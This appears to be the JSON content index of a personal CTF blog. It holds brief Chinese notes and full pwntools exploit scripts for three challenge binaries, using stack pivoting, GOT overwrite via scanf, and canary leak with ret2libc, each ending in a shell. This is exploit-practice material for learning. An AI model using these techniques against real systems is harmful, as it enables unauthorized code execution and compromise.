{"meta":{"title":"Scardow's blog","subtitle":"","description":"","author":"Scarce Shadow","url":"https://scardow.github.io","root":"/"},"pages":[{"title":"categories","date":"2021-08-16T12:03:43.000Z","updated":"2021-08-16T12:03:43.143Z","comments":true,"path":"categories/index.html","permalink":"https://scardow.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-08-16T12:03:26.000Z","updated":"2021-08-16T12:03:26.942Z","comments":true,"path":"tags/index.html","permalink":"https://scardow.github.io/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2017-05-31T02:05:56.000Z","updated":"2021-08-18T11:32:33.796Z","comments":true,"path":"about/index.html","permalink":"https://scardow.github.io/about/index.html","excerpt":"","text":""},{"title":"PWN","date":"2021-08-17T00:12:24.000Z","updated":"2021-08-17T00:12:24.961Z","comments":true,"path":"categories/PWN/index.html","permalink":"https://scardow.github.io/categories/PWN/index.html","excerpt":"","text":""}],"posts":[{"title":"PWN","slug":"About","date":"2021-08-18T11:30:56.000Z","updated":"2021-08-18T11:41:19.570Z","comments":true,"path":"2021/08/18/About/","link":"","permalink":"https://scardow.github.io/2021/08/18/About/","excerpt":"hhhhhhhhhhhhhhhhhhhh","text":"hhhhhhhhhhhhhhhhhhhh TASK 01ciscn-s-4 | Scardowstack pivoting 第一次读写泄露ebp，第二次进行栈迁移到buf位置 ebp_add =&gt; cf58 , buf =&gt; cf20 ———-&gt; offset = 0x58 - 0x20 = 0x38 12345678910111213141516171819from pwn import *from LibcSearcher import *context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)binary = &quot;./ciscn-s-4.bin&quot;p = process(binary)elf = ELF(binary)leave_add = 0x080484b8system_add = elf.plt[&#x27;system&#x27;]# 第一次溢出泄露ebp payload1 = &#x27;a&#x27; * 0x27 + &#x27;b&#x27;p.send(payload1)p.recvuntil(&#x27;b&#x27;)ebp_add = u32(p.recv(4))buf_add = ebp_add - 0x38# 第二次溢出payload2 = flat([system_add, 0xdeadbeef, (buf_add + 12), &#x27;/bin/sh\\x00&#x27;, &#x27;a&#x27; * (0x28 - 20), (buf_add - 4), leave_add])p.send(payload2)p.interactive() Wal1etGOT Hijack scanf直接将变量储存的内容当作地址进行写入 在输入name后，缓冲区会残留输入的内容 构造name，使得某个地址储存在scanf的参数的位置从而造成任意地址写 因此可知，偏移为104 123456789101112from pwn import *p =process(&#x27;./Wal1et&#x27;)elf = ELF(&#x27;./Wal1et&#x27;)puts_got = elf.got[&#x27;puts&#x27;]call_sys = 0x08048730# 将puts的got写到passcode将要加载的地址 # 第一次读取108字节，后面的地址在第二次输入中读取payload1 = &#x27;a&#x27; * 104 + p32(puts_got) + &#x27;134514480&#x27;p.sendline(&#x27;1&#x27;)p.sendline(payload1)p.interactive() baby_canaryret2libc 覆盖canary最低位泄露canary 1234567891011121314151617181920212223242526272829303132333435from pwn import *context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)binary = &#x27;./baby_canary&#x27;p = process(binary)elf = ELF(binary)libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]main_addr = 0x804931fpayload1 = &#x27;a&#x27; * 0x40p.recvuntil(&#x27;So can you tell me who you are?\\n&#x27;)p.sendline(payload1)p.recvuntil(&#x27;\\n&#x27;)canary = u32(p.recv(3).rjust(4, &#x27;\\x00&#x27;))log.success(&#x27;canary: &#x27; + hex(canary))payload2 = flat([&#x27;a&#x27;*0x40, p32(canary), &#x27;b&#x27;*(0xc-4), 0xdeadbeaf, puts_plt, main_addr, puts_got])p.recvuntil(&#x27;So what you come there for?\\n&#x27;)p.sendline(payload2)p.recvuntil(&#x27;get the flag!\\n&#x27;)puts_addr = u32(p.recv(4))libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]log.success(&quot;libc_base =&gt; &quot; + hex(libc_base))system_addr = libc_base + libc.symbols[&#x27;system&#x27;]bin_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()p.recvuntil(&#x27;are?\\n&#x27;)p.sendline(payload1)payload3 = flat([&#x27;a&#x27; * 0x40, canary, &#x27;b&#x27; * (0xc-4), 0xdeadbeaf, system_addr, main_addr, bin_addr])p.recvuntil(&#x27;for?\\n&#x27;)p.sendline(payload3)p.interactive()","categories":[],"tags":[{"name":"about","slug":"about","permalink":"https://scardow.github.io/tags/about/"}]},{"title":"Heap Exploitation","slug":"Heap Exploitation","date":"2021-08-16T23:54:01.000Z","updated":"2021-08-18T09:13:02.852Z","comments":true,"path":"2021/08/17/Heap Exploitation/","link":"","permalink":"https://scardow.github.io/2021/08/17/Heap%20Exploitation/","excerpt":"","text":"Heap introHeap","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"}]}],"categories":[],"tags":[{"name":"about","slug":"about","permalink":"https://scardow.github.io/tags/about/"},{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"}]}